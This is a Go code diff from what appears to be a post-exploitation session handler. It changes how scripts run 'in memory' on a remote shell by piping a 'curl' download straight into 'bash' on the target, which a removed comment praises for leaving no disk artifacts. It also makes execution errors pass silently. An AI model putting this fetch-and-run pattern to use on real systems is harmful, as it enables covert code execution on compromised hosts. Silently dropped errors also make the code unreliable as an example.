@@ -258,15 +258,14 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 			return fmt.Errorf("source not found: %w", err)
 		}
 	}
-	if cleanup != nil {
-		defer cleanup()
-	}
-
 	// Output file (named after script for easy identification)
 	outputPath := s.getOutputPath(localPath)
 
 	// Create empty output file for tail -f
 	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		if cleanup != nil {
+			cleanup()
+		}
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
@@ -284,23 +283,27 @@ func (s *SessionInfo) RunScriptInMemory(ctx context.Context, scriptSource string
 		// Open terminal for output
 		tailCmd := fmt.Sprintf("tail -f %s", outputPath)
 		if err := OpenTerminal(tailCmd); err != nil {
-			fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+			// Non-fatal, continue without terminal
 		}
 		time.Sleep(300 * time.Millisecond)
 
-		fmt.Println(ui.Info(fmt.Sprintf("Executing script (HTTP in-memory) and saving output to: %s", outputPath)))
-
 		go func() {
+			// Cleanup tmp file AFTER HTTP transfer completes
+			if cleanup != nil {
+				defer cleanup()
+			}
 			time.Sleep(200 * time.Millisecond)
 
-			// curl | bash - single HTTP request, zero disk artifacts, blazing fast
 			cmd := fmt.Sprintf("curl -s '%s' | bash -s%s", httpURL, argsStr)
-			if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
-				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			}
+			s.Handler.ExecuteWithStreaming(cmd, outputPath)
 		}()
 
 		return nil
+	}
+
+	// Cleanup for non-HTTP path
+	if cleanup != nil {
+		defer cleanup()
 	}
 
 	// Fallback: b64 variable upload (works without binbag)
@@ -1713,7 +1716,13 @@ func (m *Manager) StartModule(moduleName string, args []string) {
 			}
 		}()
 
+		// Suppress stdout to prevent module's fmt.Println from corrupting TUI
+		old := os.Stdout
+		devnull, _ := os.Open(os.DevNull)
+		os.Stdout = devnull
 		err := module.Run(context.Background(), session, args)
+		os.Stdout = old
+		devnull.Close()
 		m.stopSpinner(spinID)
 
 		if err != nil {
